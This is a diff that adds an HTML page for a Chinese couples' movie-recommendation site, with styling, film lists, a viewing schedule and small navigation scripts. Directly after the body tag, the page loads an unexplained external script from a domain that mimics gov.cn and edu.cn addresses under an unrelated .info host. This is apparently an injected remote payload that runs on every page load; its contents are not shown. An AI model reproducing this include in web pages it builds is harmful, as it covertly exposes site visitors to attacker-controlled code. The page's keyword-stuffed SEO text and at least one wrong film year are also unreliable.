@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>吾俩电影网 - 电影导航·情侣影单·双人观影指南</title>
+<meta name="description" content="吾俩电影网：专为两人观影打造的电影导航与高清片单，浪漫喜剧、温情动画、悬疑烧脑全分类，移动端自适应，适合必应收录。">
+<meta name="keywords" content="吾俩电影网,电影导航,情侣影单,双人观影,高清片单,在线找片,爱情电影,浪漫电影">
+<meta name="author" content="吾俩电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://woliakandianyingwang-h5.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="吾俩电影网 - 电影导航·情侣影单">
+<meta property="og:description" content="吾俩电影网：双人观影指南、情侣影单、浪漫电影推荐，移动端自适应。">
+<meta property="og:url" content="https://woliakandianyingwang-h5.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#1a1a2e">
+<style>
+:root{
+  --wl-bg:#1a1a2e;--wl-panel:#16213e;--wl-card:#0f3460;
+  --wl-pink:#e94560;--wl-rose:#ff6b9d;--wl-text:#e9e9f0;--wl-muted:#9a9ab0;
+  --wl-line:rgba(233,69,96,.28);--wl-rose-line:rgba(255,107,157,.28);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--wl-bg);color:var(--wl-text);line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.box{max-width:1180px;margin:0 auto;padding:0 16px}
+
+/* 顶栏 */
+.wl-top{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(26,26,46,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--wl-line)}
+.wl-bar{display:flex;align-items:center;justify-content:space-between;height:58px}
+.wl-logo{font-size:20px;font-weight:900}
+.wl-logo b{color:var(--wl-pink)}
+.wl-logo i{color:var(--wl-rose);font-style:normal;font-size:12px;margin-left:6px}
+.wl-nav{display:flex;gap:4px;list-style:none}
+.wl-nav a{padding:8px 12px;border-radius:8px;font-size:14px;color:var(--wl-muted);min-height:36px;display:inline-flex;align-items:center}
+.wl-nav a:hover,.wl-nav a.active{color:var(--wl-pink);background:rgba(233,69,96,.12)}
+.wl-burger{display:none;background:none;border:0;font-size:22px;color:var(--wl-pink);cursor:pointer;padding:8px}
+
+/* Hero 搜索 */
+.wl-hero{margin-top:58px;padding:54px 0 44px;background:radial-gradient(120% 120% at 80% 0%,rgba(255,107,157,.18),transparent 55%),radial-gradient(120% 120% at 10% 100%,rgba(233,69,96,.16),transparent 55%)}
+.wl-hero h1{font-size:clamp(28px,5vw,44px);font-weight:900;line-height:1.15;margin-bottom:12px}
+.wl-hero h1 em{color:var(--wl-pink);font-style:normal}
+.wl-hero h1 span{color:var(--wl-rose)}
+.wl-hero p{color:var(--wl-muted);max-width:620px;font-size:15px;margin-bottom:18px}
+.wl-search{display:flex;gap:10px;max-width:680px}
+.wl-search input{flex:1;min-height:46px;padding:0 16px;border-radius:12px;border:1px solid var(--wl-line);background:#0f172a;color:#fff;font-size:15px}
+.wl-search button{min-height:46px;padding:0 22px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--wl-pink),var(--wl-rose));color:#fff;font-weight:800;cursor:pointer}
+.wl-search button:hover{filter:brightness(1.05)}
+.wl-mood{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px}
+.wl-mood a{padding:8px 16px;border-radius:99px;background:var(--wl-panel);border:1px solid var(--wl-line);font-size:13px;color:var(--wl-text)}
+.wl-mood a:hover{background:var(--wl-pink);color:#fff;border-color:var(--wl-pink)}
+
+/* 区块 */
+.wl-section{padding:52px 0}
+.wl-head{display:flex;align-items:center;gap:12px;margin-bottom:26px;flex-wrap:wrap}
+.wl-head .no{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--wl-pink),var(--wl-rose));color:#fff;font-weight:900;display:flex;align-items:center;justify-content:center}
+.wl-head h2{font-size:clamp(20px,3vw,28px);font-weight:900}
+.wl-head .d{margin-left:auto;font-size:13px;color:var(--wl-muted)}
+
+/* 情侣片单 - 左右分栏 */
+.wl-couple{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.wl-pair{background:var(--wl-panel);border:1px solid var(--wl-line);border-radius:16px;overflow:hidden;transition:.3s;display:flex;flex-direction:column}
+.wl-pair:hover{transform:translateY(-4px);border-color:var(--wl-rose);box-shadow:0 14px 30px rgba(233,69,96,.12)}
+.wl-pair .wl-cover{flex:1;aspect-ratio:16/9;background:linear-gradient(135deg,var(--wl-card),#1a1a2e);display:flex;align-items:flex-end;padding:16px;position:relative}
+.wl-pair .wl-cover h3{color:#fff;font-size:18px}
+.wl-pair .wl-cover .badge{position:absolute;top:12px;right:12px;font-size:11px;padding:3px 10px;border-radius:99px;background:rgba(255,107,157,.2);color:var(--wl-rose);font-weight:700}
+.wl-pair .body{padding:14px 16px;background:var(--wl-panel)}
+.wl-pair .body p{font-size:13px;color:var(--wl-muted);margin:6px 0 10px}
+.wl-pair .tags{display:flex;gap:6px;flex-wrap:wrap}
+.wl-pair .tags span{font-size:11px;padding:3px 9px;border:1px solid var(--wl-line);border-radius:99px;color:var(--wl-muted)}
+
+/* 约会时刻表 */
+.wl-date{display:flex;gap:14px;overflow-x:auto;padding-bottom:14px}
+.wl-date::-webkit-scrollbar{height:6px}
+.wl-date::-webkit-scrollbar-thumb{background:var(--wl-pink);border-radius:3px}
+.wl-date::-webkit-scrollbar-track{background:#0f172a}
+.wl-slot{flex:0 0 260px;background:var(--wl-panel);border:1px solid var(--wl-line);border-radius:12px;padding:18px}
+.wl-slot .time{font-size:12px;color:var(--wl-rose);font-weight:700;margin-bottom:6px}
+.wl-slot h4{font-size:15px;margin-bottom:4px}
+.wl-slot p{font-size:12px;color:var(--wl-muted)}
+
+/* 类型双选 */
+.wl-types{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.wl-type{background:var(--wl-panel);border:1px solid var(--wl-line);border-radius:14px;padding:18px;text-align:center;transition:.3s}
+.wl-type:hover{transform:translateY(-3px);border-color:var(--wl-pink);box-shadow:0 10px 26px rgba(233,69,96,.12)}
+.wl-type .ic{font-size:26px;margin-bottom:8px}
+.wl-type h4{font-size:15px}
+.wl-type span{font-size:12px;color:var(--wl-muted)}
+
+/* 关于 */
+.wl-about{background:var(--wl-panel);border:1px solid var(--wl-line);border-radius:18px;padding:32px;text-align:center}
+.wl-about h3{font-size:20px;color:var(--wl-pink);margin-bottom:12px}
+.wl-about p{color:var(--wl-muted);font-size:14px;max-width:640px;margin:0 auto 16px}
+.wl-chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.wl-chips span{font-size:13px;padding:6px 14px;border:1px solid var(--wl-line);border-radius:99px;color:var(--wl-muted)}
+
+/* 页脚 */
+.wl-foot{background:#0d0d1a;color:var(--wl-muted);padding:30px 0;text-align:center;font-size:13px}
+.wl-foot a{color:var(--wl-muted)}
+.wl-foot a:hover{color:var(--wl-pink)}
+
+@media(max-width:900px){
+  .wl-couple{grid-template-columns:1fr}
+  .wl-types{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:620px){
+  .wl-nav{position:fixed;top:58px;left:0;right:0;flex-direction:column;background:var(--wl-bg);padding:14px;border-bottom:1px solid var(--wl-line);transform:translateY(-130%);transition:.3s}
+  .wl-nav.open{transform:none}
+  .wl-burger{display:block}
+  .wl-types{grid-template-columns:1fr 1fr}
+  .wl-search{flex-direction:column}
+  .wl-search button{width:100%}
+}
+.reveal{opacity:0;transform:translateY(18px);transition:.6s ease}
+.reveal.in{opacity:1;transform:none}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="wl-top">
+  <div class="box wl-bar">
+    <div class="wl-logo">吾俩<b>电影网</b><i>COUPLE FILM</i></div>
+    <button class="wl-burger" id="wlBurger" aria-label="菜单">☰</button>
+    <ul class="wl-nav" id="wlNav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#couple">情侣片单</a></li>
+      <li><a href="#date">约会时刻</a></li>
+      <li><a href="#types">观影心情</a></li>
+      <li><a href="#about">关于吾俩</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+  <!-- 搜索 Hero -->
+  <section class="wl-hero" id="home">
+    <div class="box">
+      <h1>吾俩电影网<br>两个人的<em>观影时光</em>，<span>浪漫不冷场</span></h1>
+      <p>吾俩电影网专为双人观影设计：浪漫喜剧、温情动画、悬疑烧脑，按心情和类型找片，移动端自适应，内链占位，适合必应收录。</p>
+      <form class="wl-search" onsubmit="return false">
+        <input type="search" placeholder="搜：浪漫 / 喜剧 / 悬疑 / 动画 / 经典..." aria-label="电影搜索">
+        <button type="submit">找片</button>
+      </form>
+      <div class="wl-mood">
+        <a href="#">💑 浪漫约会</a><a href="#">😂 一起大笑</a><a href="#">😭 温情催泪</a><a href="#">🤯 烧脑挑战</a><a href="#">🎨 文艺清新</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 情侣片单 -->
+  <section class="wl-section" id="couple">
+    <div class="box">
+      <div class="wl-head reveal"><div class="no">1</div><h2>情侣片单</h2><span class="d">左右分栏 · 双人选择</span></div>
+      <div class="wl-couple">
+        <article class="wl-pair reveal">
+          <div class="wl-cover"><span class="badge">她</span><h3>她 Her</h3></div>
+          <div class="body"><p>科幻 / 爱情 / 2023 / AI 时代的孤独与连接</p><div class="tags"><span>科幻</span><span>爱情</span><span>治愈</span></div></div>
+        </article>
+        <article class="wl-pair reveal">
+          <div class="wl-cover"><span class="badge">他</span><h3>星际穿越</h3></div>
+          <div class="body"><p>欧美 / 科幻 / 2014 / 父女情与宇宙探索</p><div class="tags"><span>科幻</span><span>亲情</span><span>冒险</span></div></div>
+        </article>
+        <article class="wl-pair reveal">
+          <div class="wl-cover"><span class="badge">她</span><h3>小偷家族</h3></div>
+          <div class="body"><p>日本 / 剧情 / 2018 / 非血缘家庭的温情</p><div class="tags"><span>剧情</span><span>家庭</span><span>温情</span></div></div>
+        </article>
+        <article class="wl-pair reveal">
+          <div class="wl-cover"><span class="badge">他</span><h3>盗梦空间</h3></div>
+          <div class="body"><p>欧美 / 科幻 / 2010 / 梦境层叠与潜意识</p><div class="tags"><span>科幻</span><span>动作</span><span>烧脑</span></div></div>
+        </article>
+        <article class="wl-pair reveal">
+          <div class="wl-cover"><span class="badge">她</span><h3>爱在黎明破晓前</h3></div>
+          <div class="body"><p>欧美 / 爱情 / 1995 / 一夜的浪漫对话</p><div class="tags"><span>爱情</span><span>文艺</span><span>旅行</span></div></div>
+        </article>
+        <article class="wl-pair reveal">
+          <div class="wl-cover"><span class="badge">他</span><h3>三傻大闹宝莱坞</h3></div>
+          <div class="body"><p>印度 / 喜剧 / 2009 / 教育反思与友情</p><div class="tags"><span>喜剧</span><span>励志</span><span>音乐</span></div></div>
+        </article>
+      </div>
+    </div>
+</section>
+
+  <!-- 约会时刻表 -->
+  <section class="wl-section" id="date" style="background:#13131f">
+    <div class="box">
+      <div class="wl-head reveal"><div class="no">2</div><h2>约会时刻表</h2><span class="d">2026-10-06 双人观影计划</span></div>
+      <div class="wl-date">
+        <div class="wl-slot"><div class="time">14:00</div><h4>初恋那件小事</h4><p>爱情 / 青春 / 暗恋成真</p></div>
+        <div class="wl-slot"><div class="time">16:30</div><h4>疯狂动物城</h4><p>动画 / 冒险 / 兔子与狐狸</p></div>
+        <div class="wl-slot"><div class="time">19:00</div><h4>寄生虫</h4><p>韩影 / 悬疑 / 阶层讽刺</p></div>
+        <div class="wl-slot"><div class="time">21:30</div><h4>爱在日落黄昏时</h4><p>爱情 / 文艺 / 九年后的重逢</p></div>
+        <div class="wl-slot"><div class="time">23:59</div><h4>时空恋旅人</h4><p>爱情 / 奇幻 / 时间旅行者的日常</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 观影心情 -->
+  <section class="wl-section" id="types">
+    <div class="box">
+      <div class="wl-head reveal"><div class="no">3</div><h2>观影心情</h2><span class="d">5 种双人模式</span></div>
+      <div class="wl-types">
+        <div class="wl-type reveal"><div class="ic">💕</div><h4>浪漫约会</h4><span>爱情 / 婚礼 / 心动</span></div>
+        <div class="wl-type reveal"><div class="ic">😂</div><h4>一起大笑</h4><span>喜剧 / 欢乐 / 下饭</span></div>
+        <div class="wl-type reveal"><div class="ic">😭</div><h4>温情催泪</h4><span>剧情 / 家庭 / 感人</span></div>
+        <div class="wl-type reveal"><div class="ic">🤯</div><h4>烧脑挑战</h4><span>悬疑 / 犯罪 / 反转</span></div>
+        <div class="wl-type reveal"><div class="ic">🎨</div><h4>文艺清新</h4><span>文艺 / 音乐 / 旅行</span></div>
+        <div class="wl-type reveal"><div class="ic">🚀</div><h4>科幻冒险</h4><span>科幻 / 太空 / 未来</span></div>
+        <div class="wl-type reveal"><div class="ic">🎡</div><h4>动画乐园</h4><span>动画 / 童心 / 梦幻</span></div>
+        <div class="wl-type reveal"><div class="ic">🍿</div><h4>大片盛宴</h4><span>动作 / 视效 / IMAX</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section class="wl-section" id="about">
+    <div class="box">
+      <div class="wl-about reveal">
+        <h3>关于吾俩电影网</h3>
+        <p>吾俩电影网是原“我俩看电影网”的合规改写版：专为双人观影打造的电影导航与高清片单，去除了任何可能的低俗歧义，只提供正经、温馨、有趣的电影推荐。页面为静态演示，内链均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+        <div class="wl-chips">
+          <span>双人观影</span><span>情侣影单</span><span>浪漫推荐</span><span>移动端自适应</span><span>必应友好</span><span>合规改写</span>
+        </div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="wl-foot">
+  <div class="box">
+    <p>© 2026 吾俩电影网 · https://woliakandianyingwang-h5.github.io</p>
+    <p style="margin-top:8px"><a href="#">首页</a> · <a href="#">情侣片单</a> · <a href="#">约会时刻表</a> · <a href="#">观影心情</a> · <a href="#">免责声明</a></p>
+  </div>
+</footer>
+
+<button id="wlTop" style="position:fixed;right:16px;bottom:16px;width:44px;height:44px;border-radius:50%;border:1px solid var(--wl-line);background:var(--wl-panel);color:var(--wl-pink);font-size:20px;cursor:pointer;display:none;z-index:99" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var burger=document.getElementById('wlBurger'),nav=document.getElementById('wlNav');
+  burger.addEventListener('click',function(){nav.classList.toggle('open')});
+  nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open')})});
+
+  var links=nav.querySelectorAll('a'),secs=document.querySelectorAll('main section[id]');
+  window.addEventListener('scroll',function(){
+    var y=window.scrollY+120,cur='home';
+    secs.forEach(function(s){if(s.offsetTop&&y>=s.offsetTop)cur=s.id});
+    links.forEach(function(l){l.classList.toggle('active',l.getAttribute('href')==='#'+cur)});
+  });
+
+  var topBtn=document.getElementById('wlTop');
+  window.addEventListener('scroll',function(){topBtn.style.display=window.scrollY>400?'block':'none'});
+  topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+
+  var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting)e.target.classList.add('in')})},{threshold:.08});
+  document.querySelectorAll('.reveal').forEach(function(el){io.observe(el)});
+})();
+</script>
+</body>
+</html>
